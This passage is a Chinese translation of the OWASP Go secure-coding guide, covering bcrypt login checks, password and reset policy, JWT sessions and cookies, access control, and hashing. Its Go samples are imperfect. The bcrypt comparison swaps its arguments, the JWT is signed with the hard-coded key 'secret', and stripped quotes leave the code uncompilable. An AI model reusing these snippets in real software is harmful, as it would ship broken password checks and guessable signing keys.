bcrypt\u8fd8\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u800c\u5b89\u5168\u7684\u65b9\u6cd5\u6765\u6bd4\u8f83\u660e\u6587\u5bc6\u7801\u548c\u5df2\u7ecf\u6563\u5217\u7684\u5bc6\u7801\uff1a ctx := context.Background() // credentials to validate email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // fetch the hashed password corresponding to the provided email record := db.QueryRowContext(ctx, SELECT hash FROM accounts WHERE email = ? LIMIT 1 , email) var expectedPassword string if err := record.Scan( expectedPassword); err != nil { // user does not exist // this should be logged (see Error Handling and Logging) but execution // should continue } if bcrypt.CompareHashAndPassword(password, []byte(expectedPassword)) != nil { // passwords do not match // passwords mismatch should be logged (see Error Handling and Logging) // error should be returned so that a GENERIC message Sign-in attempt has // failed, please check your credentials can be shown to the user. } \u5bc6\u7801\u7b56\u7565 \u5bc6\u7801\u662f\u4e00\u79cd\u5386\u53f2\u8d44\u4ea7\uff0c\u662f\u5927\u591a\u6570\u8ba4\u8bc1\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u662f\u653b\u51fb\u8005\u7684\u5934\u53f7\u76ee\u6807\u3002 \u5f88\u591a\u65f6\u5019\u4e00\u4e9b\u670d\u52a1\u4f1a\u6cc4\u9732\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5c3d\u7ba1\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u5176\u4ed6\u4e2a\u4eba\u6570\u636e\u4e5f\u6cc4\u9732\u4e86\uff0c\u4f46\u6700\u5927\u7684\u95ee\u9898\u662f\u5bc6\u7801\u3002\u4e3a\u4ec0\u4e48\uff1f\u56e0\u4e3a\u5bc6\u7801\u4e0d\u5bb9\u6613\u7ba1\u7406\u548c\u8bb0\u5fc6\uff0c\u7528\u6237\u503e\u5411\u4e8e\u4f7f\u7528\u5f31\u5bc6\u7801\uff08\u4f8b\u5982\u201c123456\u201d\uff09\u4ed6\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u8bb0\u4f4f\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u4e2d\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\u3002 \u5982\u679c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u767b\u5f55\u9700\u8981\u5bc6\u7801\uff0c\u60a8\u53ef\u4ee5\u505a\u7684\u6700\u597d\u7684\u4e8b\u60c5\u662f\"\u5f3a\u5236\u6267\u884c\u5bc6\u7801\u590d\u6742\u6027\u8981\u6c42\uff0c\u8981\u6c42\u4f7f\u7528\u5b57\u6bcd\u4ee5\u53ca\u6570\u5b57\u548c/\u6216\u7279\u6b8a\u5b57\u7b26\"\u3002\u5bc6\u7801\u957f\u5ea6\u4e5f\u5e94\u8be5\u5f3a\u5236\u8981\u6c42\uff1a\"\u901a\u5e38\u4f7f\u75288\u4e2a\u5b57\u7b26\uff0c\u4f4616\u4e2a\u5b57\u7b26\u66f4\u597d\uff0c\u6216\u8005\u8003\u8651\u4f7f\u7528\u591a\u4e2a\u5355\u8bcd\u7684\u5bc6\u7801\u77ed\u8bed\"\u3002 \u5f53\u7136\uff0c\u524d\u9762\u7684\u6307\u5bfc\u539f\u5219\u90fd\u4e0d\u4f1a\u963b\u6b62\u7528\u6237\u91cd\u65b0\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\u3002\u6700\u597d\u7684\u529e\u6cd5\u662f\"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801\"\uff0c\u9632\u6b62\u5bc6\u7801\u91cd\u590d\u4f7f\u7528\u3002\u5173\u952e\u7cfb\u7edf\u53ef\u80fd\u9700\u8981\u66f4\u9891\u7e41\u7684\u66f4\u6539\uff0c\u5fc5\u987b\u5bf9\u91cd\u7f6e\u4e4b\u95f4\u7684\u65f6\u95f4\u8fdb\u884c\u7ba1\u7406\u63a7\u5236\u201d\u3002 \u91cd\u7f6e \u5373\u4f7f\u60a8\u6ca1\u6709\u5e94\u7528\u4efb\u4f55\u989d\u5916\u7684\u5bc6\u7801\u7b56\u7565\uff0c\u7528\u6237\u4ecd\u7136\u9700\u8981\u80fd\u591f\u91cd\u7f6e\u4ed6\u4eec\u7684\u5bc6\u7801\u3002\u8fd9\u79cd\u673a\u5236\u4e0e\u6ce8\u518c\u6216\u767b\u5f55\u4e00\u6837\u91cd\u8981\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\uff0c\u786e\u4fdd\u60a8\u7684\u7cfb\u7edf\u4e0d\u4f1a\u6cc4\u9732\u654f\u611f\u6570\u636e\uff0c\u4e5f\u4e0d\u4f1a\u53d7\u5230\u5371\u5bb3\u3002 \"\u5bc6\u7801\u66f4\u6539\u65f6\u95f4\u4e0d\u80fd\u5c11\u4e8e1\u5929\"\u3002\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u5bf9\u5bc6\u7801\u91cd\u590d\u4f7f\u7528\u7684\u653b\u51fb\u3002\u6bcf\u5f53\u4f7f\u7528\"\u57fa\u4e8e\u7535\u5b50\u90ae\u4ef6\u7684\u91cd\u7f6e\uff0c\u53ea\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u5230\u9884\u5148\u6ce8\u518c\u7684\u5730\u5740\u4e0e\u4e34\u65f6\u94fe\u63a5/\u5bc6\u7801\"\uff0c\u8fd9\u4e2a\u94fe\u63a5\u5e94\u8be5\u6709\u4e00\u4e2a\u5f88\u77ed\u7684\u5230\u671f\u65f6\u95f4\u3002 \u6bcf\u5f53\u8bf7\u6c42\u5bc6\u7801\u91cd\u7f6e\u65f6\u5e94\u901a\u77e5\u7528\u6237\u3002\u540c\u6837\u4e34\u65f6\u5bc6\u7801\u4e5f\u5e94\u8be5\u5728\u4e0b\u6b21\u4f7f\u7528\u65f6\u66f4\u6539\u3002 \u5bc6\u7801\u91cd\u7f6e\u7684\u4e00\u4e2a\u5e38\u89c1\u505a\u6cd5\u662f\"\u5b89\u5168\u95ee\u9898\"\uff0c\u5176\u7b54\u6848\u4ee5\u524d\u662f\u7531\u5e10\u6237\u6240\u6709\u8005\u914d\u7f6e\u7684\u3002\u5bc6\u7801\u91cd\u7f6e\u95ee\u9898\u5e94\u652f\u6301\u8db3\u591f\u7684\u968f\u673a\u7b54\u6848\uff1a\u8be2\u95ee\"\u6700\u559c\u7231\u7684\u4e66\"\uff1f\u53ef\u80fd\u7b54\u6848\u603b\u4f1a\u662f\"\u5723\u7ecf\"\uff0c\u8fd9\u4f7f\u5f97\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\u6210\u4e3a\u4e00\u4e2a\u574f\u95ee\u9898\u3002 \u5176\u5b83\u6307\u5357 \u8eab\u4efd\u9a8c\u8bc1\u662f\u4efb\u4f55\u7cfb\u7edf\u7684\u5173\u952e\u90e8\u5206\uff0c\u56e0\u6b64\u60a8\u5e94\u8be5\u59cb\u7ec8\u91c7\u7528\u6b63\u786e\u548c\u5b89\u5168\u7684\u505a\u6cd5\u3002\u4ee5\u4e0b\u662f\u4f7f\u60a8\u7684\u8ba4\u8bc1\u7cfb\u7edf\u66f4\u5177\u5f39\u6027\u7684\u4e00\u4e9b\u6307\u5bfc\u539f\u5219\uff1a \u5728\u6267\u884c\u5173\u952e\u64cd\u4f5c\u4e4b\u524d\u91cd\u65b0\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\uff1b \u5bf9\u9ad8\u5ea6\u654f\u611f\u6216\u9ad8\u4ef7\u503c\u4ea4\u6613\u5e10\u6237\u4f7f\u7528\u591a\u56e0\u7d20\u8eab\u4efd\u9a8c\u8bc1\uff1b \u5229\u7528\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u5b9e\u65bd\u76d1\u63a7\u4ee5\u8bc6\u522b\u9488\u5bf9\u591a\u4e2a\u7528\u6237\u5e10\u6237\u7684\u653b\u51fb\u3002\u5f53\u7528\u6237ID\u53ef\u4ee5\u88ab\u83b7\u53d6\u6216\u731c\u6d4b\u65f6\uff0c\u8fd9\u79cd\u653b\u51fb\u6a21\u5f0f\u7528\u4e8e\u7ed5\u8fc7\u6807\u51c6\u9501\u5b9a\uff1b \u66f4\u6539\u4f9b\u5e94\u5546\u63d0\u4f9b\u7684\u6240\u6709\u9ed8\u8ba4\u5bc6\u7801\u548c\u7528\u6237ID\u6216\u7981\u7528\u5173\u8054\u5e10\u6237\uff1b \u5728\u5df2\u786e\u5b9a\u7684\u65e0\u6548\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\uff08\u4f8b\u5982\uff1a\u4e94\u6b21\u5c1d\u8bd5\u662f\u5e38\u89c1\u7684\uff09\u540e\u5f3a\u5236\u7981\u7528\u5e10\u6237\u3002\u5fc5\u987b\u7981\u7528\u8be5\u5e10\u6237\u4e00\u6bb5\u65f6\u95f4\uff0c\u8fd9\u6bb5\u65f6\u95f4\u5fc5\u987b\u8db3\u4ee5\u963b\u6b62\u5bf9\u51ed\u636e\u7684\u91ce\u86ee\u731c\u6d4b\uff0c\u4f46\u4e0d\u80fd\u957f\u5230\u5141\u8bb8\u6267\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 Session\u7ba1\u7406 \u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6839\u636eOWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u6765\u4ecb\u7ecd\u4f1a\u8bdd\u7ba1\u7406\u7684\u91cd\u8981\u5185\u5bb9\u3002\u63d0\u4f9b\u4e86\u4e00\u4e2a\u793a\u4f8b\u4ee5\u53ca\u5b9e\u8df5\u539f\u7406\u6982\u8ff0\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u5305\u542b\u5b8c\u6574\u7a0b\u5e8f\u4ee3\u7801\u7684\u6587\u4ef6\u5939\u3002\u4f1a\u8bdd\u8fdb\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u5728\u5904\u7406\u4f1a\u8bdd\u7ba1\u7406\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u53ea\u8bc6\u522b\u670d\u52a1\u5668\u4e2d\u7684\u4f1a\u8bdd\u7ba1\u7406\u63a7\u4ef6\uff0c\u5e76\u5728\u5728\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u4e0a\u521b\u5efa\u4f1a\u8bdd\u3002\u5728\u63d0\u4f9b\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528JWT\u751f\u6210\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a // create a JWT and put in the clients cookie func setToken(res http.ResponseWriter, req *http.Request) { ... } \u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u7528\u4e8e\u751f\u6210\u4f1a\u8bdd\u6807\u8bc6\u7b26\u7684\u7b97\u6cd5\u662f\u8db3\u591f\u968f\u673a\u7684\uff0c\u4ee5\u9632\u6b62\u4f1a\u8bdd\u88ab\u66b4\u529b\u7834\u89e3\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a ... token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, _ := token.SignedString([]byte( secret )) //our secret ... \u65e2\u7136\u53c8\u4e86\u8db3\u591f\u5f3a\u7684\u4ee4\u724c\uff0c\u6211\u4eec\u5fc5\u987b\u7ed9cookie\u8bbe\u7f6e Domain \u3001 Path \u3001 Expires \u3001 HTTPOnly \u3001 Secure \u7b49\u53c2\u6570\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u628aExpires\u503c\u8bbe\u7f6e\u4e3a30\u5206\u949f\u4ee5\u6b64\u6765\u964d\u4f4e\u5e94\u7528\u7a0b\u5e8f\u98ce\u9669\u3002 // Our cookie parameter cookie := http.Cookie{ Name: Auth , Value: signedToken, Expires: expireCookie, HttpOnly: true, Path: / , Domain: 127.0.0.1 , Secure: true } http.SetCookie(res, cookie) //Set the cookie \u6bcf\u6b21\u6210\u529f\u767b\u5f55\u540e\u90fd\u4f1a\u751f\u6210\u65b0\u7684\u4f1a\u8bdd\uff0c\u5386\u53f2\u4f1a\u8bdd\u5c06\u4e0d\u4f1a\u88ab\u91cd\u65b0\u4f7f\u7528\uff0c\u5373\u4f7f\u5b83\u6ca1\u6709\u8fc7\u671f\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528Expire\u53c2\u6570\u5f3a\u5236\u5b9a\u671f\u7ec8\u6b62\u4f1a\u8bdd\uff0c\u4ee5\u9632\u6b62\u4f1a\u8bdd\u52ab\u6301\u3002Cookie\u7684\u53e6\u5916\u4e00\u4e2a\u91cd\u8981\u56e0\u7d20\u662f\u4e0d\u5141\u8bb8\u540c\u4e00\u7528\u6237\u540c\u65f6\u767b\u5f55\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4fdd\u5b58\u767b\u5f55\u7528\u6237\u5217\u8868\u5b8c\u6210\uff0c\u5c06\u65b0\u7684\u767b\u5f55\u7528\u6237\u540d\u4e0e\u5217\u8868\u8fdb\u884c\u5bf9\u6bd4\uff0c\u767b\u5f55\u7528\u6237\u5217\u8868\u901a\u5e38\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d\u3002 \u4f1a\u8bdd\u6807\u8bc6\u7b26\u4e0d\u5141\u8bb8\u5b58\u50a8\u5728URL\u4e2d\uff0c\u4ec5\u5141\u8bb8\u4fdd\u5b58\u5728HTTP Cookie\u5934\u4e2d\u3002\u4e00\u4e2a\u4e0d\u597d\u7684\u5217\u5b50\u5c31\u662f\u4f7f\u7528GET\u4f20\u9012\u4f1a\u8bdd\u6807\u8bc6\u7b26\u53c2\u6570\u3002\u4f1a\u8bdd\u6570\u636e\u8fd8\u5fc5\u987b\u53d7\u5230\u4fdd\u62a4\uff0c\u4ee5\u9632\u670d\u52a1\u5668\u7684\u5176\u5b83\u7528\u6237\u672a\u7ecf\u6388\u6743\u76f4\u63a5\u8bbf\u95ee\u3002 HTTP\u6539\u4e3aHTTPS\uff0c\u9632\u6b62\u7f51\u7edc\u55c5\u63a2\u4f1a\u8bdd\u7684MITM\u653b\u51fb\u3002\u6700\u4f73\u5b9e\u8df5\u662f\u5728\u6240\u6709\u7684\u8bf7\u6c42\u4e2d\u4f7f\u7528HTTPS\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a err := http.ListenAndServeTLS( :443 , cert/cert.pem , cert/key.pem , nil) if err != nil { log.Fatal( ListenAndServe: , err) } \u5728\u9ad8\u654f\u611f\u6216\u5173\u952e\u64cd\u4f5c\u7684\u8bf7\u6c42\u4e2d\uff0c\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u800c\u4e0d\u662f\u6bcf\u4e2a\u4f1a\u8bdd\u751f\u6210\u4ee4\u724c\u3002\u59cb\u7ec8\u786e\u4fdd\u4ee4\u724c\u7684\u968f\u673a\u6027\uff0c\u5e76\u4e14\u8db3\u6709\u8db3\u591f\u7684\u5b89\u5168\u957f\u5ea6\u9632\u6b62\u66b4\u529b\u7834\u89e3\u3002 \u5728\u4f1a\u8bdd\u7ba1\u7406\u4e2d\u8981\u8003\u8651\u7684\u6700\u540e\u4e00\u4e2a\u65b9\u9762\u662f\u6ce8\u9500\u529f\u80fd\u3002\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u63d0\u4f9b\u4e00\u4e2a\u4ece\u6240\u6709\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u9875\u9762\u6ce8\u9500\u7684\u65b9\u6cd5\uff0c\u5e76\u5b8c\u5168\u7ec8\u6b62\u5173\u8054\u7684\u4f1a\u8bdd\u548c\u94fe\u63a5\u3002\u793a\u4f8b\u4e2d\uff0c\u5f53\u7528\u6237\u6ce8\u9500\u65f6\uff0ccookie\u9700\u8981\u4ece\u5ba2\u6237\u7aef\u5220\u9664\uff0c\u4e5f\u9700\u8981\u4ece\u670d\u52a1\u7aef\u5220\u9664\u3002 ... cookie, err := req.Cookie( Auth ) //Our auth token if err != nil { res.Header().Set( Content-Type , text/html ) fmt.Fprint(res, Unauthorized - Please login br ) fmt.Fprintf(res, a href=\\ login\\ Login /a ) return } ... \u5b8c\u6574\u7684\u4f8b\u5b50\uff0c\u8bf7\u8bbf\u95ee\uff1a session.go \u8bbf\u95ee\u63a7\u5236 \u5728\u5904\u7406\u8bbf\u95ee\u63a7\u5236\u65f6\uff0c\u8981\u91c7\u53d6\u7684\u7b2c\u4e00\u6b65\u662f\u4ec5\u4f7f\u7528\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u5bf9\u8c61\u8fdb\u884c\u8bbf\u95ee\u6388\u6743\u51b3\u7b56\u3002\u5728 \u4f1a\u8bdd\u7ba1\u7406 \u90e8\u5206\u63d0\u4f9b\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528JWT\u5b9e\u73b0\u4e86\u8fd9\u4e00\u70b9\u3002JSONWeb\u4ee4\u724c\u5728\u670d\u52a1\u5668\u7aef\u751f\u6210\u4f1a\u8bdd\u4ee4\u724c\u3002 // create a JWT and put in the clients cookie func setToken(res http.ResponseWriter, req *http.Request) { //30m Expiration for non-sensitive applications - OWASP expireToken := time.Now().Add(time.Minute * 30).Unix() expireCookie := time.Now().Add(time.Minute * 30) //token Claims claims := Claims{ {...} } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, _ := token.SignedString([]byte( secret )) \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5b58\u50a8\u548c\u4f7f\u7528\u8fd9\u4e2a\u4ee4\u724c\u6765\u9a8c\u8bc1\u7528\u6237\u5e76\u5f3a\u5236\u6211\u4eec\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u578b\u3002 \u7528\u4e8e\u8bbf\u95ee\u6388\u6743\u7684\u7ec4\u4ef6\u5e94\u8be5\u662f\u4e00\u4e2a\u5355\u4e00\u7684\u3001\u5728\u7ad9\u70b9\u8303\u56f4\u5185\u4f7f\u7528\u7684\u7ec4\u4ef6\u3002\u8fd9\u5305\u62ec\u8c03\u7528\u5916\u90e8\u6388\u6743\u670d\u52a1\u7684\u5e93\u3002 \u5982\u679c\u51fa\u73b0\u6545\u969c\uff0c\u8bbf\u95ee\u63a7\u5236\u5e94\u5b89\u5168\u5931\u6548\u3002\u5728Go\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Defer\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u6587\u6863\u7684 \u9519\u8bef\u65e5\u5fd7 \u90e8\u5206\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u65e0\u6cd5\u8bbf\u95ee\u5176\u914d\u7f6e\u4fe1\u606f\uff0c\u5219\u5e94\u62d2\u7edd\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709\u8bbf\u95ee\u3002 \u5e94\u8be5\u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u5b9e\u65bd\u6388\u6743\u63a7\u5236\uff0c\u5305\u62ec\u670d\u52a1\u5668\u7aef\u811a\u672c\u4ee5\u53ca\u6765\u81ea\u5ba2\u6237\u7aef\u6280\u672f\uff08\u5982Ajax\u6216Flash\uff09\u7684\u8bf7\u6c42\u3002 \u6b63\u786e\u5730\u5c06\u7279\u6743\u903b\u8f91\u4e0e\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u7684\u5176\u4f59\u90e8\u5206\u5206\u5f00\u4e5f\u662f\u5f88\u91cd\u8981\u7684\u3002 \u4e3a\u9632\u6b62\u672a\u7ecf\u6388\u6743\u7684\u7528\u6237\u8bbf\u95ee\uff0c\u5fc5\u987b\u6267\u884c\u8bbf\u95ee\u63a7\u5236\u7684\u5176\u4ed6\u91cd\u8981\u64cd\u4f5c\u5305\u62ec\uff1a \u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90 \u53d7\u4fdd\u62a4\u7684URL \u53d7\u4fdd\u62a4\u529f\u80fd \u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 \u670d\u52a1 \u5e94\u7528\u7a0b\u5e8f\u6570\u636e \u7528\u6237\u548c\u6570\u636e\u5c5e\u6027\u4ee5\u53ca\u7b56\u7565\u4fe1\u606f \u5728\u63d0\u4f9b\u7684\u793a\u4f8b\u4e2d\uff0c\u6d4b\u8bd5\u7b80\u5355\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528\u3002 \u6b64\u4ee3\u7801\u57fa\u4e8e\u4f1a\u8bdd\u7ba1\u7406\u4e2d\u7684\u793a\u4f8b\u6784\u5efa \u3002 \u5728\u5b9e\u73b0\u8fd9\u4e9b\u8bbf\u95ee\u63a7\u5236\u65f6\uff0c\u91cd\u8981\u7684\u662f\u9a8c\u8bc1\u8bbf\u95ee\u63a7\u5236\u89c4\u5219\u7684\u670d\u52a1\u5668\u7aef\u5b9e\u73b0\u548c\u8868\u793a\u5c42\u8868\u793a\u662f\u5426\u5339\u914d\u3002 \u5982\u679c\u72b6\u6001\u6570\u636e\u9700\u8981\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\uff0c\u5219\u9700\u8981\u4f7f\u7528\u52a0\u5bc6\u548c\u5b8c\u6574\u6027\u68c0\u67e5\u4ee5\u9632\u6b62\u7be1\u6539\u3002 \u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\u6d41\u5fc5\u987b\u7b26\u5408\u4e1a\u52a1\u89c4\u5219\u3002 \u5904\u7406\u4e8b\u52a1\u65f6\uff0c\u5355\u4e2a\u7528\u6237\u6216\u8bbe\u5907\u5728\u7ed9\u5b9a\u65f6\u95f4\u6bb5\u5185\u53ef\u4ee5\u6267\u884c\u7684\u4e8b\u52a1\u6570\u5fc5\u987b\u9ad8\u4e8e\u4e1a\u52a1\u8981\u6c42\uff0c\u4f46\u5fc5\u987b\u8db3\u591f\u4f4e\uff0c\u4ee5\u9632\u6b62\u7528\u6237\u6267\u884cDoS\u7c7b\u578b\u7684\u653b\u51fb\u3002 \u91cd\u8981\u7684\u662f\u8981\u6ce8\u610f\uff0c\u4ec5\u4f7f\u7528referer HTTP\u5934\u4e0d\u8db3\u4ee5\u9a8c\u8bc1\u6388\u6743\uff0c\u5e94\u4ec5\u7528\u4f5c\u8865\u5145\u68c0\u67e5\u3002 \u5bf9\u4e8e\u7ecf\u8fc7\u957f\u65f6\u95f4\u9a8c\u8bc1\u7684\u4f1a\u8bdd\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u5b9a\u671f\u91cd\u65b0\u8bc4\u4f30\u7528\u6237\u7684\u6388\u6743\uff0c\u4ee5\u9a8c\u8bc1\u7528\u6237\u7684\u6743\u9650\u662f\u5426\u672a\u66f4\u6539\u3002\u5982\u679c\u6743\u9650\u5df2\u66f4\u6539\uff0c\u8bf7\u6ce8\u9500\u7528\u6237\u5e76\u5f3a\u5236\u4ed6\u4eec\u91cd\u65b0\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u4e3a\u4e86\u9075\u5b88\u5b89\u5168\u7a0b\u5e8f\uff0c\u7528\u6237\u5e10\u6237\u8fd8\u5e94\u8be5\u6709\u4e00\u79cd\u5ba1\u8ba1\u65b9\u6cd5\u3002\uff08\u4f8b\u5982\uff0c\u5728\u5bc6\u7801\u8fc7\u671f30\u5929\u540e\u7981\u7528\u7528\u6237\u5e10\u6237\uff09\u3002 \u5e94\u7528\u7a0b\u5e8f\u8fd8\u5fc5\u987b\u652f\u6301\u5728\u7528\u6237\u7684\u6388\u6743\u88ab\u64a4\u9500\u65f6\u7981\u7528\u5e10\u6237\u548c\u7ec8\u6b62\u4f1a\u8bdd\u3002\uff08\u4f8b\u5982\u89d2\u8272\u53d8\u66f4\u3001\u5c31\u4e1a\u72b6\u51b5\u7b49\uff09\u3002 \u5f53\u652f\u6301\u5916\u90e8\u670d\u52a1\u5e10\u6237\u548c\u652f\u6301\u4ece\u5916\u90e8\u7cfb\u7edf\u6216\u5230\u5916\u90e8\u7cfb\u7edf\u7684\u8fde\u63a5\u7684\u5e10\u6237\u65f6\uff0c\u8fd9\u4e9b\u5e10\u6237\u5fc5\u987b\u4ee5\u5c3d\u53ef\u80fd\u4f4e\u7684\u6743\u9650\u7ea7\u522b\u8fd0\u884c\u3002 \u5bc6\u7801\u5b66\u5b9e\u8df5 \u8ba9\u6211\u4eec\u8ba9\u7b2c\u4e00\u53e5\u8bdd\u50cf\u60a8\u7684\u52a0\u5bc6\u6280\u672f\u4e00\u6837\u5f3a\u5927\uff1a \u54c8\u5e0c\u548c\u52a0\u5bc6\u662f\u4e24\u79cd\u4e0d\u540c\u7684\u4e1c\u897f \u3002 \u8fd9\u662f\u4e00\u4e2a\u666e\u904d\u7684\u8bef\u89e3\uff0c\u800c\u4e14\u5927\u591a\u6570\u65f6\u5019\u54c8\u5e0c\u548c\u52a0\u5bc6\u662f\u4ea4\u66ff\u4f7f\u7528\u7684\uff0c\u9519\u8bef\u7684\u3002\u5b83\u4eec\u662f\u4e0d\u540c\u7684\u6982\u5ff5\uff0c\u4e5f\u6709\u4e0d\u540c\u7684\u7528\u9014\u3002 \u54c8\u5e0c\u662f\u7531\uff08\u54c8\u5e0c\uff09\u51fd\u6570\u4ece\u6e90\u6570\u636e\u751f\u6210\u7684\u5b57\u7b26\u4e32\u6216\u6570\u5b57\uff1a hash := F(data) \u54c8\u5e0c\u7684\u957f\u5ea6\u56fa\u5b9a\uff0c\u5176\u503c\u968f\u8f93\u5165\u7684\u5fae\u5c0f\u53d8\u5316\u800c\u53d8\u5316\u5f88\u5927\uff08\u4ecd\u53ef\u80fd\u53d1\u751f\u51b2\u7a81\uff09\u3002\u597d\u7684\u54c8\u5e0c\u7b97\u6cd5\u4e0d\u5141\u8bb8\u5c06\u54c8\u5e0c\u8f6c\u6362\u4e3a\u5176\u539f\u59cb\u6e90\u3002MD5\u662f\u6700\u6d41\u884c\u7684\u6563\u5217\u7b97\u6cd5\uff0c\u4f46\u5b89\u5168\u6027 blake2 \u88ab\u8ba4\u4e3a\u662f\u6700\u5f3a\u548c\u6700\u7075\u6d3b\u7684\u3002 Go\u8865\u5145\u52a0\u5bc6\u5e93\u63d0\u4f9b\u4e86 blake2b \uff08\u6216\u4ec5blake2\uff09\u548c blake2s \u5b9e\u73b0\uff1a\u524d\u8005\u9488\u5bf964\u4f4d\u5e73\u53f0\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u540e\u8005\u9488\u5bf98\u523032\u4f4d\u5e73\u53f0\u8fdb\u884c\u4e86\u4f18\u5316\u3002\u5982\u679cblake2\u4e0d\u53ef\u7528\uff0c\u5219sha-256\u662f\u6b63\u786e\u7684\u9009\u9879\u3002 \u6bcf\u5f53\u4f60\u6709\u4e00\u4e9b\u4f60\u4e0d\u9700\u8981\u77e5\u9053\u5b83\u662f\u4ec0\u4e48\u7684\u4e1c\u897f\uff0c\u4f46\u53ea\u6709\u5f53\u5b83\u662f\u5e94\u8be5\u662f\u4ec0\u4e48\u7684\u65f6\u5019\uff08\u6bd4\u5982\u4e0b\u8f7d\u540e\u68c0\u67e5\u6587\u4ef6\u5b8c\u6574\u6027\uff09\uff0c\u4f60\u5e94\u8be5\u4f7f\u7528hashing package main import fmt import io import crypto/md5 import crypto/sha256 import golang.org/x/crypto/blake2s func main () { h_md5 := md5.New() h_sha := sha256.New() h_blake2s, _ := blake2s.New256(nil) io.WriteString(h_md5, Welcome to Go Language Secure Coding Practices ) io.WriteString(h_sha, Welcome to Go Language Secure Coding Practices ) io.WriteString(h_blake2s, Welcome to Go Language Secure Coding Practices ) fmt.Printf( MD5 : %x\\n , h_md5.Sum(nil)) fmt.Printf( SHA256 : %x\\n , h_sha.Sum(nil)) fmt.Printf( Blake2s-256: %x\\n , h_blake2s.Sum(nil)) } \u8f93\u51fa MD5 : ea9321d8fb0ec6623319e49a634aad92 SHA256 : ba4939528707d791242d1af175e580c584dc0681af8be2a4604a526e864449f6 Blake2s-256: 1d65fa02df8a149c245e5854d980b38855fd2c78f2924ace9b64e8b21b3f2f82 \u6ce8\u610f \uff1a\u8981\u8fd0\u884c\u6e90\u4ee3\u7801\u793a\u4f8b\uff0c\u60a8\u9700\u8981\u8fd0\u884c $go get golang.org/x/crypto/blake2s \u53e6\u4e00\u65b9\u9762\uff0c\u52a0\u5bc6\u4f7f\u7528\u5bc6\u94a5\u5c06\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u53d8\u957f\u5ea6\u7684\u6570\u636e encrypted_data := F(data, key) \u4e0e\u6563\u5217\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b63\u786e\u7684\u89e3\u5bc6\u51fd\u6570\u548c\u5bc6\u94a5\uff0c\u4ece\u52a0\u5bc6\u7684\u6570\u636e\u4e2d\u8ba1\u7b97\u6570\u636e\u3002 data := F\u207b\u00b9(encrypted_data, key) 